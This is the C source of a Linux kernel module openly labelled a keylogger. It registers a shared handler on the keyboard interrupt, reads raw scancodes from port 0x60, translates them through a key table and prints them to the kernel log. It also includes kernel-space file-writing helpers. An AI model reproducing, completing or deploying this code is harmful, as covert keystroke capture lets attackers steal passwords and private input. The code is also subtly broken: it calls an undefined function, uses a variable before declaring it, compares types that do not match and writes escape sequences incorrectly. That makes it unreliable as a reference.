#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <asm/segment.h>
#include <linux/buffer_head.h>
#include <linux/interrupt.h>
#include <asm/io.h>

#ifndef __KERNEL__
#define __KERNEL__
#endif

#define KBD_INPUT_PORT	0x60    /* address of keyboard input buffer */

int shiftPressed = 0;

// FUNCTION PROTOTYPES
struct file *createFile(const char *path, int flags, int rights);
int file_write(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size);
static irqreturn_t get_scancode(int irq, void *dev_id);
void scancode_to_key(char scancode);

//Matrix of all characters we will be tracking. Assuming a standard 101/102 US keyboard

const char *scancodes[][2] = {
  {"/0", "/0"}, {"/e", "/e"}, {"1", "!"}, {"2", "@"}, {"3", "#"},
  {"4", "$"}, {"5", "%"}, {"6", "^"}, {"7", "&"}, {"8", "*"},
  {"9", "("}, {"0", ")"}, {"-","_"}, {"=", "+"}, {"/b", "/b"},
  {"/t", "/t"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r","R"}, {"t", "T"},
  {"y", "Y"}, {"u", "U"}, {"i","I"}, {"o", "O"}, {"p", "P"}, {"[", "{"},
  {"]", "}"}, {"/n", "/n"}, {"LCtrl", "LCtrl"}, {"a", "A"}, {"s", "S"}, {"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"}, {"j", "J"}, {"k", "K"}, {"l", "L"},
  {";", ":"}, {"\'", "\""}, {"`", "~"},{"LShift", "LShift"}, {"\\", "|"},
  {"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},{"b", "B"}, {"n", "N"},
  {"m", "M"}, {",", "<"},{".", ">"}, {"/", "?"}, {"RShift", "RShift"},
  {"PrtScn", "KeyPad"},{"LAlt", "LAlt"}, {" ", " "}, {"CapsLock", "CapsLock"},  {"F1", "F1"},{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"}, 
  {"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},{"F10", "F10"},
  {"NumLock", "NumLock"}, {"ScrollLock", "ScrollLock"}, {"Keypad-7", "Home"},
  {"Keypad-8", "Up"}, {"Keypad-9", "PgUp"},{"-", "-"}, {"Keypad-4", "Left"},
  {"Keypad-5", "Keypad-5"},{"Keypad-6", "Right"}, {"+", "+"}, {"Keypad-1", "End"},    {"Keypad-2", "Down"}, {"Keypad-3", "PgDn"}, {"Keypad-0", "Ins"}, 
  {"Keypad-", "Del"}, {"Alt-SysRq", "Alt-SysRq"}, {"\0", "\0"},{"\0", "\0"},
  {"F11", "F11"}, {"F12", "F12"} };                                

//Creating the output file
struct file *createFile(const char *path, int flags, int rights) 
{
    struct file *fileP = NULL;
    mm_segment_t oldFileSpace;
    int err = 0;

    oldFileSpace = get_fs();
    set_fs(get_ds());
    fileP =  filp_open(path, flags, rights);
    set_fs(oldFileSpace);
    if (IS_ERR(fileP)) {
        err = PTR_ERR(fileP);
        return NULL;
    }
    return fileP;
}

//Write to the output file
int file_write(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size) 
{
	mm_segment_t oldFileSpace;
    int ret;

    oldFileSpace = get_fs();
    set_fs(get_ds());

    ret = vfs_write(file, data, size, &offset);

    set_fs(oldFileSpace);
    return ret;
}

// gets the scancode of each pressed key
static irqreturn_t get_scancode(int irq, void *dev_id)
{
	unsigned char scancode;
	scancode = inb(KBD_INPUT_PORT);
	get_key(scancode);
    return IRQ_HANDLED;
}

void scancode_to_key(char scancode)
{
	i = (unsigned)scancode;
	unsigned int i;

	if (scancodes[i][0] != '\0')
	{
		printk("%s\n", scancodes[i][0]);
	}
}
  
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("A kernel-based keylogger module");

int __init init_keylogger(void)
{
	printk(KERN_INFO "Hello! Keylogger module successfully loaded.\n");
	request_irq(1, get_scancode, IRQF_SHARED, "kbd2", (void *)get_scancode);
	return 0;
}

void __exit exit_module(void)
{
	printk(KERN_INFO "Exiting keylogger kernel module.\n");
	free_irq(1, (void *)get_scancode);
	return;
}

module_init(init_keylogger);
module_exit(exit_module);
